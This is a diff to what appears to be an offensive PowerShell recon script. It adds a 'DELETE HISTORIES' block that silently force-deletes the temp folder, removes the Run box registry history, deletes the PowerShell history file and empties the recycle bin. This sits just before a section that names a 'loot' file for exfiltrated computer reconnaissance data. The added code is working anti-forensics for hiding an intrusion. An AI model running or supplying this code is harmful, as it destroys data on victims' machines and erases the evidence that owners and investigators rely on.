@@ -151,6 +151,22 @@ Get-WmiObject Win32_VideoController | Format-Table Name, VideoProcessor, DriverV
 
 ######################################################################################################################################################################
 
+# DELETE HISTORIES
+
+# Delete Contents of Temp Folder
+rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+
+# Delete Run Box History
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+
+#Delete PowerShell History
+Remove-Item (Get-PSreadlineOption).HistorySavePath
+
+# Deletes Contents of Recycle Bin
+Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+
+######################################################################################################################################################################
+
 #Loot folder for exfil data
 $FileName = "$env:USERNAME-$(get-date -f 'M/d/yyyy h:mm tt')_computer_recon.txt"
 
